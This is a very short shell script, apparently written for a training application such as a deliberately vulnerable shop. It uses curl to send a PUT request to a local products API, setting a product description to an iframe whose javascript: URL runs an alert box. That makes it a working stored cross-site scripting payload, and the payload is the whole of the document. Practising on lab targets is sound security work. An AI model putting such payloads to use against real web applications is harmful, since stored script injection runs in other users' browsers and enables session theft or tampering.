#!/bin/sh

curl -X PUT http://localhost:3000/api/products/6 \
    -H "Content-Type: application/json" \
    -d '{"description":"<iframe src=\"javascript:alert(`xss!!!`)\">"}'
